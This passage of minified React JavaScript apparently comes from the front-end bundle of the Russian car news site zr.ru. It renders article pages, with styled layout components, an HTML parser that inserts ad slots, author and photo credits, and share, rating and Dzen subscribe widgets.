            content: "max-image-preview:large"
          }), u && !u.dontshowInAMP && l.createElement("link", {
            rel: "amphtml",
            href: "https://".concat(s.serverName).concat(u.ampUrl)
          })), u && l.createElement(Ve, {
            story: u
          }), l.createElement(qe, {
            url: p(),
            title: a || "",
            description: o || ""
          }), u && l.createElement(Ke, {
            story: u
          }));
        }
        function tt(e) {
          var t = e.children;
          return l.createElement(l.Fragment, null, l.createElement(et, null), l.createElement(Be, null, l.createElement(De, null), l.createElement(Fe, null, t), l.createElement(_e, null)));
        }
        var it = i(5833),
          nt = i(7742),
          rt = i(131);
        function at(e) {
          var t = e.children,
            i = e.onChangeInViewport,
            n = (0, rt.YD)({
              threshold: 0,
              rootMargin: "-30% 0px -30% 0px"
            }),
            r = n.ref,
            a = n.inView;
          return (0, l.useEffect)(function () {
            i(a);
          }, [a]), l.createElement("div", {
            ref: r
          }, t);
        }
        var ot = i(8865),
          lt = i(8207),
          ct = i(2700),
          st = s.ZP.div.withConfig({
            displayName: "styled__StoryWrapper",
            componentId: "sc-1fuepes-0"
          })(["display:flex;justify-content:space-between;.image-gallery{margin-top:2rem;}.image-gallery.fullscreen-modal{margin:0;}.image-gallery.fullscreen-modal{z-index:200;}.image-gallery.fullscreen-modal .image-gallery-slide-wrapper{padding-bottom:73px;box-sizing:border-box;height:100%;display:flex;}.image-gallery.fullscreen-modal .image-gallery-swipe{height:100%;display:flex;width:100%;}.image-gallery.fullscreen-modal .image-gallery-slides{display:flex;width:100%;align-items:center;}.image-gallery.fullscreen-modal .image-gallery-slide{width:100%;overflow:hidden;}.image-gallery.fullscreen-modal .image-gallery-thumbnails-wrapper{display:none;}.image-gallery.fullscreen-modal .image-gallery-content.bottom.fullscreen{height:100%;}.image-gallery.fullscreen-modal .image-gallery-content{height:100%;}.image-gallery.fullscreen-modal .image-gallery-slide.center{overflow:visible !important;}.image-gallery.fullscreen-modal .image-gallery-slide-wrapper.bottom{padding-bottom:0;}.image-gallery-thumbnail.active,.image-gallery-thumbnail:focus{border-color:#970000;}.image-gallery-thumbnail:hover{border-color:#ddd;}.image-gallery-icon:hover{color:#970000;}.form-field-rich-img{height:auto;max-width:100%;margin:5px 0 5px 0;width:100%;}.form-field-rich-img h2{display:none;}.form-field-rich-img span{display:none;}.table .caption{display:inline-block;font-weight:700;line-height:1.2;font-size:1.125rem;}@media (max-width:1024px){.image-gallery.fullscreen-modal .image-gallery-content{height:auto;}.table .caption{display:block;font-size:1rem;margin-top:11px;line-height:1.1875rem;font-weight:700;}}@media (min-width:1900px){.image-gallery.fullscreen-modal .image-gallery-slide-wrapper{padding-bottom:80px;}}"]),
          Mt = s.ZP.div.withConfig({
            displayName: "styled__SpecialStoryAuthor",
            componentId: "sc-1fuepes-1"
          })(["margin-top:-17px;margin-bottom:9px;font-size:14px;line-height:30px;letter-spacing:0.2em;color:#7f7f7f;text-transform:uppercase;"]),
          dt = s.ZP.div.withConfig({
            displayName: "styled__StoryDescription",
            componentId: "sc-1fuepes-2"
          })(["font-size:1.5rem;line-height:1.2;margin-bottom:1.625rem;"]),
          gt = s.ZP.div.withConfig({
            displayName: "styled__StoryBody",
            componentId: "sc-1fuepes-3"
          })(["line-height:1.2;font-size:1.125rem;p{padding:0 3.375rem 0 4rem;margin:1.25rem 0;}div[data-slot-name]{clear:both;}a{color:#1c88d4;}ol{padding-left:3.5rem;}ol li,li{padding-left:0.5rem;}h2,h3,h4{margin-top:1.25rem;}u{text-decoration:none !important;background-image:linear-gradient(#b7d6e8,#b7d6e8) !important;background-position:0 0.15rem !important;background-repeat:repeat-x !important;background-size:auto 1.25rem !important;}.dondo{h3{padding:0;}p{margin:0;font-size:16px;}}table{border-radius:4px;font-size:13px;border-radius:4px;font-size:13px;border-collapse:collapse;border-spacing:0;background-color:#fff;width:100%;border:none;padding:0 4rem 1.25rem;margin-top:1rem;tr:first-child td{border-top:none;}td{font-weight:400;vertical-align:top;text-align:left;line-height:17px;padding:10px 6px;border-top:1px solid #dadadc !important;}table tr:first-child td,table tr:first-child th,.table tr:first-child td,.table tr:first-child th{border-top:none;}h1,h2,h3,h4{padding:0 0 12px 0;}p{padding:0;font-size:1rem;margin-bottom:0rem;margin-top:0rem;&:not(last-child){margin-bottom:0.625rem;}}}"]),
          ut = s.ZP.div.withConfig({
            displayName: "styled__VideoStories",
            componentId: "sc-1fuepes-4"
          })(["margin:20px 0;"]),
          mt = s.ZP.div.withConfig({
            displayName: "styled__VideoStoriesTitle",
            componentId: "sc-1fuepes-5"
          })(["font-size:26px;line-height:33px;font-weight:700;padding:0;text-align:left;margin-bottom:10px;color:#970000;"]),
          pt = s.ZP.div.withConfig({
            displayName: "styled__VideoStoriesWrapper",
            componentId: "sc-1fuepes-6"
          })(["display:flex;justify-content:space-between;"]),
          yt = s.ZP.div.withConfig({
            displayName: "styled__VideoStory",
            componentId: "sc-1fuepes-7"
          })(["width:32%;flex-shrink:0;position:relative;margin-bottom:40px;height:136px;"]),
          It = (0, s.ZP)(ct.Z).withConfig({
            displayName: "styled__VideoStoryImg",
            componentId: "sc-1fuepes-8"
          })(["height:136px;object-fit:cover;display:block;background:no-repeat center center;background-size:cover;position:relative;-webkit-filter:grayscale(100%);filter:grayscale(100%);opacity:0.75;max-width:100%;"]),
          Nt = s.ZP.span.withConfig({
            displayName: "styled__VideoStoryIcon",
            componentId: "sc-1fuepes-9"
          })(["position:absolute;top:50%;left:50%;display:block;background:url(", ") 50% 50% no-repeat;background-size:cover;width:43px;height:43px;transform:translate(-50%,-50%);"], lt.Z),
          jt = s.ZP.div.withConfig({
            displayName: "styled__VideoStoryName",
            componentId: "sc-1fuepes-10"
          })(["font-size:15px;line-height:18px;font-weight:700;padding:11px 0 0;"]),
          ht = s.ZP.div.withConfig({
            displayName: "styled__StoryNoteSubscribe",
            componentId: "sc-1fuepes-11"
          })(["margin:25px 0 0 40px;display:flex;flex-flow:row;justify-content:space-between;align-items:center;"]),
          xt = s.ZP.p.withConfig({
            displayName: "styled__StoryNoteSubscribeText",
            componentId: "sc-1fuepes-12"
          })(['font-size:15px;font-weight:400;line-height:19px;display:block;position:relative;padding:0 16px 0 0;&:after{content:"";width:14px;height:11px;position:absolute;top:50%;transform:translateY(-50%);right:0;background:url(', ") 0 0 no-repeat;}"], "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iOSIgaGVpZ2h0PSIxNCIgdmlld0JveD0iMCAwIDkgMTQiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Ik05IDdMMC43NDk5OTkgMTMuMDYyMkwwLjc1IDAuOTM3ODIyTDkgN1oiIGZpbGw9IiNDNEM0QzQiLz4KPC9zdmc+Cg=="),
          Dt = s.ZP.a.withConfig({
            displayName: "styled__StoryNoteSubscribeLink",
            componentId: "sc-1fuepes-13"
          })(["display:block;padding:5px 15px;box-sizing:border-box;border-radius:22px;font-size:15px;line-height:30px;font-weight:700;color:#970000;"]),
          ft = s.ZP.div.withConfig({
            displayName: "styled__StoryInfo",
            componentId: "sc-1fuepes-14"
          })(["color:#757474;font-size:0.9375rem;"]),
          wt = s.ZP.div.withConfig({
            displayName: "styled__StoryInfoWrap",
            componentId: "sc-1fuepes-15"
          })(["display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;padding:0.625rem 0 0.3125rem;&:not(:last-child){border-bottom:0.0625rem solid #b5b5b7;}"]),
          zt = s.ZP.div.withConfig({
            displayName: "styled__StoryInfoAuthors",
            componentId: "sc-1fuepes-16"
          })(["display:flex;align-items:center;margin-right:2.25rem;"]),
          Tt = s.ZP.div.withConfig({
            displayName: "styled__InfoAuthor",
            componentId: "sc-1fuepes-17"
          })(["display:flex;align-items:center;margin-right:6px;"]),
          Lt = s.ZP.div.withConfig({
            displayName: "styled__StoryInfoPhoto",
            componentId: "sc-1fuepes-18"
          })(["font-size:1rem;span{margin-left:10px;}"]),
          Et = s.ZP.div.withConfig({
            displayName: "styled__StoryInfoMarks",
            componentId: "sc-1fuepes-19"
          })(["display:flex;align-items:center;"]),
          At = s.ZP.div.withConfig({
            displayName: "styled__InfoMarksTitle",
            componentId: "sc-1fuepes-20"
          })(["margin-right:0.625rem;"]),
          bt = s.ZP.div.withConfig({
            displayName: "styled__InfoShare",
            componentId: "sc-1fuepes-21"
          })(["display:flex;align-items:center;"]),
          vt = s.ZP.div.withConfig({
            displayName: "styled__StoryDisclaimer",
            componentId: "sc-1fuepes-22"
          })(["margin:0 -16px 30 px;border:1px solid #e3e3e3;padding:5px;color:#4f4f4f;font-weight:700;font-size:12px;border-radius:5px;"]),
          Ot = s.ZP.div.withConfig({
            displayName: "styled__StoryNote",
            componentId: "sc-1fuepes-23"
          })(["position:relative;margin:20px 0;"]),
          kt = (s.ZP.div.withConfig({
            displayName: "styled__StoryBanner",
            componentId: "sc-1fuepes-24"
          })(["margin:20px 0 35px;width:100%;"]), s.ZP.div.withConfig({
            displayName: "styled__CommentsPanel",
            componentId: "sc-1fuepes-25"
          })(["margin-top:1.875rem;@media (max-width:1024px){margin-bottom:2rem;}"]), s.ZP.div.withConfig({
            displayName: "styled__CommentsTitle",
            componentId: "sc-1fuepes-26"
          })(["font-size:1.25rem;font-weight:700;margin-bottom:0.875rem;@media (max-width:1024px){font-size:1.25rem;font-weight:800;a{font-size:1.25rem;font-weight:800;}}"])),
          Ct = s.ZP.p.withConfig({
            displayName: "styled__StoryParagraph",
            componentId: "sc-1fuepes-27"
          })(["padding:0 3.375rem 0 4rem;line-height:1.33;font-size:1.125rem;margin:1.25rem 0;&:first-child{margin-top:0;}"]),
          St = s.ZP.h2.withConfig({
            displayName: "styled__StoryH2",
            componentId: "sc-1fuepes-28"
          })(["margin-top:1.25rem;"]),
          Zt = s.ZP.div.withConfig({
            displayName: "styled__Readmore3",
            componentId: "sc-1fuepes-29"
          })(["clear:both;display:flex;margin:1.25rem 0 1.25rem 0;"]),
          Qt = (0, s.ZP)(d.rH).withConfig({
            displayName: "styled__Readmore3Item",
            componentId: "sc-1fuepes-30"
          })(['position:relative;width:100%;box-sizing:border-box;display:flex;flex-direction:column;justify-content:flex-start;&:hover{border-color:transparent;}&:before{position:absolute;content:"";width:100%;height:84px;border-right:0.0625rem solid #970000;border-left:0.0625rem solid #970000;z-index:1;}&:after{position:absolute;content:"";width:100%;height:84px;background-color:rgba(255,255,255,0.5);}']),
          Pt = (0, s.ZP)(ct.Z).withConfig({
            displayName: "styled__Readmore3Img",
            componentId: "sc-1fuepes-31"
          })(["width:100%;max-width:100%;height:84px;box-sizing:border-box;object-fit:cover;filter:grayscale(100%) contrast(150%);"]),
          Ut = s.ZP.span.withConfig({
            displayName: "styled__Readmore3Header",
            componentId: "sc-1fuepes-32"
          })(["padding:0 20px 0 8px;font-size:0.9375rem;line-height:1;margin-top:10px;display:block;font-weight:400;margin-top:0.625 rem;z-index:0;background:0 0;color:#000;"]),
          Yt = s.ZP.div.withConfig({
            displayName: "styled__BlockReadmore",
            componentId: "sc-1fuepes-33"
          })(["margin-bottom:0.75rem;float:left;margin-right:1rem;", ""], (0, M.fq)("$rightReadmore", (0, s.iv)(["float:right;margin-left:1rem;margin-right:0;"]))),
          _t = (0, s.ZP)(d.rH).withConfig({
            displayName: "styled__BlockReadmoreItem",
            componentId: "sc-1fuepes-34"
          })(["width:15rem;display:block;&:hover{border-color:transparent;}"]),
          Wt = (0, s.ZP)(ct.Z).withConfig({
            displayName: "styled__BlockReadmoreImg",
            componentId: "sc-1fuepes-35"
          })(["width:100%;max-width:100%;height:154px;border-left:0.0625 rem solid #970000;border-right:0.0625 rem solid #970000;box-sizing:border-box;object-fit:cover;"]),
          Gt = s.ZP.span.withConfig({
            displayName: "styled__BlockReadmoreHeader",
            componentId: "sc-1fuepes-36"
          })(["display:block;font-weight:800;font-size:0.9375rem;margin-top:0.625rem;z-index:0;background:0 0;color:#000;"]),
          Rt = s.ZP.blockquote.withConfig({
            displayName: "styled__BlockQuote",
            componentId: "sc-1fuepes-37"
          })(['font-style:italic;font-size:1.2rem;padding:0 3.375rem 0 4rem;margin:-2.5rem 0px 1rem 0;color:rgb(60,60,60);&:before{content:"“ ";font-size:10rem;letter-spacing:-9rem;color:#970000;line-height:0;position:relative;top:6.5rem;left:-5rem;}']),
          Ht = s.ZP.div.withConfig({
            displayName: "styled__StoryImgContainer",
            componentId: "sc-1fuepes-38"
          })(["margin:5px 0 15px 0;clear:both;display:inline-block;width:100%;.image-gallery{margin-top:0rem;}", " ", " ", " @media (max-width:1024px){", " ", "}"], (0, M.fq)("$imgAlignLeft", (0, s.iv)(["float:left;margin-right:15px;"])), (0, M.fq)("$imgAlignRight", (0, s.iv)(["float:right;margin-left:15px;"])), (0, M.fq)("$imgThumbnail", (0, s.iv)(["width:240px;border-radius:0;"])), (0, M.fq)("$imgAlignLeft", (0, s.iv)(["width:50%;"])), (0, M.fq)("$imgAlignRight", (0, s.iv)(["width:50%;"]))),
          Bt = (0, s.ZP)(ct.Z).withConfig({
            displayName: "styled__StoryBodyImg",
            componentId: "sc-1fuepes-39"
          })(["margin-top:0;margin-bottom:0;display:block;height:auto;object-fit:cover;max-width:100%;"]),
          Ft = s.ZP.span.withConfig({
            displayName: "styled__StoryImgDescription",
            componentId: "sc-1fuepes-40"
          })(["display:inline-block;font-weight:700;margin-top:0.5rem;"]),
          Jt = s.ZP.ul.withConfig({
            displayName: "styled__StoryList",
            componentId: "sc-1fuepes-41"
          })(["padding:10px 3.375rem 10px 4rem;font-size:1.125rem;line-height:1.33;li{margin-bottom:0.5rem;}"]),
          Vt = s.ZP.div.withConfig({
            displayName: "styled__VideoStoryImgWrapper",
            componentId: "sc-1fuepes-42"
          })(["display:block;"]),
          $t = s.ZP.div.withConfig({
            displayName: "styled__DesktopContainer",
            componentId: "sc-1fuepes-43"
          })(["display:block;"]),
          qt = s.ZP.div.withConfig({
            displayName: "styled__MobileContainer",
            componentId: "sc-1fuepes-44"
          })(["display:none;"]),
          Xt = s.ZP.article.withConfig({
            displayName: "styled__StoryItem",
            componentId: "sc-1fuepes-45"
          })(["max-width:682px;@media (max-width:1024px){max-width:100%;.video-micro-schema{position:relative;padding-bottom:56.25%;padding-top:25px;height:0;}.video-micro-schema iframe{position:absolute;top:0;left:0;width:100%;height:100%;}h1{color:#000000;margin-top:1rem;font-weight:800;}", "{font-size:1.3125rem;line-height:1.5rem;margin-bottom:1rem;}", "{font-size:1rem;line-height:1.1875rem;letter-spacing:-0.0125rem;h1,h2,h3{font-weight:800;}.table td p{font-size:0.875rem;}table td img{max-width:512px;object-fit:cover;}}", "{font-size:1.0625rem;padding:0;margin:1rem 0;}", "{font-size:0.875rem;line-height:1rem;width:42%;", "}", "{color:#970000;font-weight:400;width:auto;}", "{margin:0 0 7px 0;height:105px;}", "{display:block;font-weight:800;font-style:normal;color:rgb(0,0,0);margin-right:12px;font-size:0.875rem;}", "{padding:1rem 0 1rem 50px;font-style:italic;font-weight:normal;font-size:1rem;line-height:1.1875rem;letter-spacing:0.0125rem;&:before{left:-4.2rem;}}", "{margin:1rem -10px 1rem -12px;}", "{font-size:0.875rem;font-weight:400;line-height:1rem;color:rgb(0,0,0);padding:6px 6px 0 12px;font-style:normal;}", "{display:block;font-size:1rem;line-height:1.1875rem;margin:1rem 0 0 0;font-weight:800;}", "{font-size:1.0625rem;margin:1rem 0 1rem 1rem;padding:0;li{list-style-type:disc;}}", "{font-size:24px;text-transform:uppercase;line-height:28px;font-weight:400;padding:0;text-align:center;margin-bottom:10px;}", "{height:auto;margin-bottom:0;}", "{height:63px;position:relative;}", "{height:63px;}", "{width:23px;height:16px;}", "{font-size:13px;line-height:15px;font-weight:400;padding:11px 0 0;color:#000;}", "{flex-flow:column;}", "{text-align:center;padding:0;span{display:block;}&:after{top:50px;left:50%;transform:rotate(90deg);}}", "{padding:5px 0;margin-top:7px;}", "{margin:0 auto;}", "{display:none;}", "{display:none;}", "{display:block;}", "{font-size:1rem;line-height:1.1875rem;margin-bottom:2rem;}", "{margin-right:0;}", "{font-size:1rem;}", "{flex-flow:row;align-items:baseline;padding-top:0rem;width:100%;span{display:block;}}", "{display:block;max-width:200px;padding:7px 26px;margin:auto;text-align:center;height:45px;border:2px solid #970000;border-radius:8px;color:#970000;font-size:1.5rem;font-weight:400;line-height:1.5rem;margin-top:36px;background-color:transparent;a{color:#970000;}}}"], dt, gt, Ct, Yt, (0, M.fq)("$rightReadmore", (0, s.iv)(["margin:0 -12px 0 24px;"])), _t, Wt, Gt, Rt, Zt, Ut, Ft, Jt, mt, yt, Vt, It, Nt, jt, ht, xt, Dt, ht, Et, $t, qt, ft, zt, Lt, bt, kt),
          Kt = s.ZP.div.withConfig({
            displayName: "styled__SidebarWrapper",
            componentId: "sc-1fuepes-46"
          })(["@media (max-width:1024px){display:none;}"]);
        function ei(e) {
          var t = e.advertisment,
            i = e.partnerStory;
          return l.createElement(Mt, null, t && "на правах рекламы", i && "партнерский материал");
        }
        function ti() {
          var e = (0, c.v9)(te.nZ);
          return e.length ? l.createElement(ut, null, l.createElement(mt, null, "Наше новое видео"), l.createElement(pt, null, e.map(function (e) {
            var t = e.href,
              i = e.name,
              n = e.picture,
              r = e.id;
            return l.createElement(yt, {
              key: r
            }, t && l.createElement(d.rH, {
              href: t,
              color: "#000"
            }, l.createElement(Vt, null, n && l.createElement(It, {
              picture: n,
              placeholderHeight: [136, 63],
              withoutWrap: !0
            }), l.createElement(Nt, null)), l.createElement(jt, null, i)));
          }))) : null;
        }
        var ii = i(9145),
          ni = i(3225),
          ri = i(9801),
          ai = i(5167),
          oi = i(9590),
          li = i.n(oi),
          ci = i(5020),
          si = i(63),
          Mi = i(3230),
          di = function (e) {
            var t = e.xml,
              i = e.id,
              n = (0, c.v9)(te.xK);
            return l.createElement(gt, {
              id: i
            }, function (e, t) {
              var i = 0,
                n = {
                  replace: function (e) {
                    if (e instanceof ci.W_ && "p" === e.name && 0 === e.children.length) return l.createElement(l.Fragment, null);
                    if (e instanceof ci.W_ && "span" === e.name && 0 === e.children.length) return l.createElement(l.Fragment, null);
                    if (e instanceof ci.W_ && "br" === e.name) return l.createElement("br", null);
                    if (e instanceof ci.W_ && "p" === e.name && 0 !== e.children.length) {
                      var r = (0, ci.e_)(e.attribs);
                      if (e && null === e.parent) {
                        if (3 === (i += 1)) return l.createElement(l.Fragment, null, !t && l.createElement(Ne.Wr, {
                          slot: "7",
                          isVisible: [!0, !1]
                        }), " ", !t && l.createElement(Ne.Wr, {
                          slot: "code_index_now_comments",
                          isVisible: [!1, !0]
                        }), l.createElement(Ct, null, (0, ci.du)(e.children)));
                        if (8 === i) return l.createElement(l.Fragment, null, l.createElement(Ne.Wr, {
                          slot: "11",
                          isVisible: [!0, !1]
                        }), " ", l.createElement(Ne.Wr, {
                          slot: "category_list_6",
                          isVisible: [!1, !0]
                        }), l.createElement(Ct, null, (0, ci.du)(e.children)));
                      }
                      return l.createElement(Ct, r, (0, ci.du)(e.children));
                    }
                    if (e instanceof ci.W_ && "h2" === e.name) return l.createElement(St, null, (0, ci.du)(e.children));
                    if (e instanceof ci.W_ && "h3" === e.name) {
                      var a = (0, ci.e_)(e.attribs);
                      return l.createElement("h3", a, (0, ci.du)(e.children));
                    }
                    if (e instanceof ci.W_ && "h4" === e.name) {
                      var o = (0, ci.e_)(e.attribs);
                      return l.createElement("h4", o, (0, ci.du)(e.children));
                    }
                    if (e instanceof ci.W_ && "readmore" === e.attribs.class && e.children.length > 3) return l.createElement(Zt, null, e.children.map(function (e, t) {
                      return l.createElement(l.Fragment, {
                        key: t
                      }, "item" === e.attribs.class && l.createElement(Qt, {
                        href: e.attribs.href,
                        color: "#000"
                      }, e.children.map(function (e, t) {
                        return l.createElement(l.Fragment, {
                          key: t
                        }, "img" === e.name && l.createElement(Pt, {
                          picture: {
                            width: e.attribs.width,
                            height: e.attribs.height,
                            servingUrl: e.attribs.src
                          },
                          placeholderHeight: [84, 84],
                          noFormatUrl: !0,
                          withoutWrap: !0
                        }), "span" === e.name && l.createElement(Ut, null, e.children[0].data));
                      })));
                    }));
                    if (e instanceof ci.W_ && -1 !== (e.attribs.class || "").indexOf("block-readmore")) {
                      var c = -1 === (e.attribs.class || "").indexOf("left");
                      return l.createElement(Yt, {
                        $rightReadmore: c
                      }, e.children.map(function (e, t) {
                        return l.createElement(l.Fragment, {
                          key: t
                        }, e.attribs && "item" === e.attribs.class && l.createElement(_t, {
                          href: e.attribs.href,
                          color: "#000"
                        }, e.children.map(function (e, t) {
                          return l.createElement(l.Fragment, {
                            key: t
                          }, "img" === e.name && l.createElement(Wt, {
                            picture: {
                              width: e.attribs.width,
                              height: e.attribs.height,
                              servingUrl: e.attribs.src
                            },
                            placeholderHeight: [154, 105],
                            noFormatUrl: !0,
                            withoutWrap: !0
                          }), "span" === e.name && l.createElement(Gt, null, (0, ci.du)(e.children)));
                        })));
                      }));
                    }
                    if (e instanceof ci.W_ && "blockquote" === e.name) return l.createElement(Rt, null, (0, ci.du)(e.children));
                    if (e instanceof ci.W_ && -1 !== (e.attribs.class || "").indexOf("image-micro-schema") && e.parent && "dondo" === e.parent.attribs.class) return l.createElement("div", {
                      className: "image-gallery",
                      "aria-live": "polite"
                    }, e.children.map(function (e, t) {
                      return l.createElement(l.Fragment, {
                        key: t
                      }, "i" === e.name && l.createElement(l.Fragment, null, e.children.map(function (e, t) {
                        return l.createElement(l.Fragment, {
                          key: t
                        }, "img" === e.name && l.createElement("img", {
                          src: e.attribs.src,
                          width: "100%"
                        }), "span" === e.name && "description" === e.attribs.itemprop && 0 !== e.children.length && l.createElement(Ft, null, e.children[0].data));
                      })), "img" === e.name && l.createElement("img", {
                        src: e.attribs.src,
                        width: "100%"
                      }), "span" === e.name && "description" === e.attribs.itemprop && 0 !== e.children.length && l.createElement(Ft, null, e.children[0].data));
                    }));
                    if (e instanceof ci.W_ && -1 !== (e.attribs.class || "").indexOf("image-micro-schema")) {
                      var s = -1 !== (e.attribs.class || "").indexOf("alignleft"),
                        M = -1 !== (e.attribs.class || "").indexOf("alignright"),
                        d = -1 !== (e.attribs.class || "").indexOf("size-thumbnail");
                      return l.createElement(Ht, {
                        $imgAlignLeft: s,
                        $imgAlignRight: M,
                        $imgThumbnail: d
                      }, e.children.map(function (e, t) {
                        var i = [{
                          original: e.attribs.src,
                          thumbnail: e.attribs.src,
                          description: e.attribs.comment,
                          width: e.attribs.width,
                          height: e.attribs.height
                        }];
                        return l.createElement(l.Fragment, {
                          key: t
                        }, "i" === e.name && l.createElement(l.Fragment, null, e.children.map(function (e, t) {
                          return l.createElement(l.Fragment, {
                            key: t
                          }, "img" === e.name && l.createElement(Bt, {
                            picture: {
                              servingUrl: e.attribs.src,
                              width: e.attribs.width,
                              height: e.attribs.height
                            },
                            noFormatUrl: !0
                          }), "span" === e.name && "description" === e.attribs.itemprop && 0 !== e.children.length && l.createElement(Ft, null, e.children[0].data));
                        })), "img" === e.name && l.createElement(Mi.Z, {
                          gallery: i,
                          showThumb: !1
                        }), "span" === e.name && "description" === e.attribs.itemprop && 0 !== e.children.length && l.createElement(Ft, null, e.children[0].data));
                      }));
                    }
                    if (e instanceof ci.W_ && "caption" === e.attribs.class) return l.createElement(l.Fragment, null);
                    if (e instanceof ci.W_ && "div" === e.name && "video-micro-schema" === e.attribs.class) return l.createElement(ot.Z, {
                      placeholderHeight: [150, 150],
                      preventUnload: !0
                    }, (0, ci.du)(e.children));
                    if (e instanceof ci.W_ && "iframe" === e.name) {
                      var g = (0, ci.e_)(e.attribs);
                      return l.createElement("iframe", g);
                    }
                    if (e instanceof ci.W_ && ("index-gal" === e.attribs.class || "gallery-panel" === e.attribs.class)) return l.createElement(l.Fragment, null);
                    if (e instanceof ci.W_ && "ul" === e.name) return l.createElement(Jt, null, (0, ci.du)(e.children));
                    if (e instanceof ci.W_ && "table" === e.name) {
                      var u = (0, ci.e_)(e.attribs);
                      return l.createElement("table", u, (0, ci.du)(e.children));
                    }
                    if (e instanceof ci.W_ && "div" === e.name && "dondo" === e.attribs.class) {
                      var m = (0, ci.e_)(e.attribs);
                      return l.createElement("div", m, (0, ci.du)(e.children, n));
                    }
                    return e instanceof ci.W_ && "div" === e.name && e.children.length > 0 ? l.createElement(l.Fragment, null, (0, ci.du)(e.children, n)) : l.createElement(l.Fragment, null);
                  }
                };
              return (0, ci.ZP)(e, n);
            }(t, n || !1));
          };
        const gi = (0, l.memo)(di);
        function ui(e) {
          var t = e.story,
            i = t.advertisment,
            n = t.partnerStory,
            r = t.textAuthor,
            a = t.authors;
          return i || n ? l.createElement(zt, null, l.createElement(Tt, null, l.createElement(d.IY, {
            advertisment: i,
            partnerStory: n
          }))) : t.textAuthor ? l.createElement(zt, null, l.createElement(Tt, null, l.createElement(d.IY, {
            textAuthor: r
          }))) : l.createElement(zt, null, a && l.createElement(l.Fragment, null, a.map(function (e) {
            return l.createElement(Tt, {
              key: e.id
            }, l.createElement(d.IY, {
              author: e,
              avatarSize: 30
            }));
          })));
        }
        function mi(e) {
          var t = e.story,
            i = t.photoAuthors,
            n = t.photoAuthorNote,
            r = t.videoAuthorNote;
          return i ? l.createElement(Lt, null, "Фото:", i.map(function (e, t) {
            return l.createElement(d.IY, {
              author: e,
              withoutAvatar: !0,
              key: t
            });
          })) : n ? l.createElement(Lt, null, "Фото:", n && l.createElement(d.IY, {
            withoutAvatar: !0,
            textAuthor: n
          })) : r ? l.createElement(Lt, null, "Видео:", r && l.createElement(d.IY, {
            withoutAvatar: !0,
            textAuthor: r
          })) : null;
        }
        function pi(e) {
          var t = e.story,
            i = t.picture,
            n = t.advertisment,
            r = t.partnerStory,
            a = t.visitCounter,
            o = t.commentCounter,
            c = t.date,
            s = t.href,
            M = t.name,
            g = t.ratingPlusCounter,
            u = t.ratingMinusCounter,
            m = t.id,
            p = i && "https://www.zr.ru".concat(i.href);
          return l.createElement(ft, null, l.createElement(wt, null, l.createElement(ui, {
            story: t
          }), l.createElement($t, null, l.createElement(mi, {
            story: t
          })), !(n || r) && l.createElement(d.pZ, {
            visits: a,
            comments: o
          })), l.createElement(wt, null, l.createElement("div", null, c && l.createElement(d.Mj, {
            dateNumber: !0,
            date: c
          })), l.createElement(qt, null, l.createElement(mi, {
            story: t
          })), l.createElement(bt, null, l.createElement("span", null, "Поделиться: "), l.createElement(d.mB, {
            url: "https://www.zr.ru".concat(s),
            title: M,
            image: p || ""
          })), l.createElement(Et, null, l.createElement(At, null, "Оцените материал:"), l.createElement(d.v1, {
            width: 25,
            height: 23,
            ratingPlus: g,
            ratingMinus: u,
            localPrefix: "story_vote",
            id: m,
            type: "story"
          }))));
        }
        const yi = (0, l.memo)(function (e) {
          var t = e.hasAdblock,
            i = e.story,
            n = e.disableRelap,
            r = e.disableSmi2,
            a = e.disableSvk,
            c = e.disableInRead,
            s = e.review,
            M = e.isFirstScroll,
            g = i["data-type"],
            u = i.carReview,
            m = i.carModels,
            p = m || [],
            y = o()(p, 1)[0];
          return l.createElement(l.Fragment, null, l.createElement(ht, null, l.createElement(xt, null, "Понравилась заметка? ", l.createElement("span", null, "Подпишись и будешь всегда в курсе!")), "story" === g && l.createElement(Dt, {
            href: "https://dzen.ru/zr.ru",
            target: "_blank"
          }, "За рулем в Дзен"), "news" === g && l.createElement(Dt, {
            href: "https://dzen.ru/news?favid=1025&issue_tld=ru",
            target: "_blank"
          }, "За рулем в новостях на Дзен")), l.createElement(pi, {
            story: i
          }), !t && l.createElement(l.Fragment, null, !a && l.createElement(Ot, {
            as: ot.Z,
            withMinHeight: !1
          }, l.createElement(d.rk, null)), !r && l.createElement(Ot, {
            as: ot.Z,
            placeholderHeight: [300]
          }, l.createElement(d.Fh, null))), l.createElement(Ne.Wr, {
            slot: "23",
            isVisible: [!0, !1]
          }), l.createElement(Ne.Wr, {
            slot: "code_relap_before",
            isVisible: [!1, !0]
          }), !u && m && 1 === m.length && l.createElement(d.Im, {
            carModel: y,
            carReview: s
          }), !t && !n && l.createElement(ot.Z, {
            placeholderHeight: [300],
            preventUnload: !0
          }, l.createElement(d.hM, null)), !c && M && l.createElement(l.Fragment, null, l.createElement(Ne.Wr, {
            slot: "17",
            isVisible: [!0, !1]
          }), l.createElement(Ne.Wr, {
            slot: "120",
            isVisible: [!1, !0]
          })));
        });
        function Ii(e, t) {
          var i = Object.keys(e);
          if (Object.getOwnPropertySymbols) {
            var n = Object.getOwnPropertySymbols(e);
            t && (n = n.filter(function (t) {
              return Object.getOwnPropertyDescriptor(e, t).enumerable;
            })), i.push.apply(i, n);
          }
          return i;
        }
        function Ni(e) {
          for (var t = 1; t < arguments.length; t++) {
            var i = null != arguments[t] ? arguments[t] : {};
            t % 2 ? Ii(Object(i), !0).forEach(function (t) {
              r()(e, t, i[t]);
            }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(i)) : Ii(Object(i)).forEach(function (t) {
              Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(i, t));
            });
          }
          return e;
        }
        var ji = (0, l.memo)(function (e) {
          var t = e.story,
            i = e.disableSmi2,
            n = void 0 === i || i,
            r = e.disableSvk,
            a = void 0 !== r && r,
            c = e.disableRelap,
            s = void 0 !== c && c,
            M = e.disableInRead,
            d = e.poll,
            g = e.hasAdblock,
            u = e.review,
            m = e.docsReference,
            p = e.isFirstScroll,
            y = e.storyId,
            I = t.name,
            N = t.advertisment,
            j = t.partnerStory,
            h = t.announcementXml,
            x = t.pagination,
            D = t.paginationSelected,
            f = t.contentXml,
            w = t.additionalContentXml,
            z = t.nextHref,
            T = t.prevHref,
            L = t["data-type"],
            E = t["data-type"],
            A = t.contentGalleryXml,
            b = f || w || "",
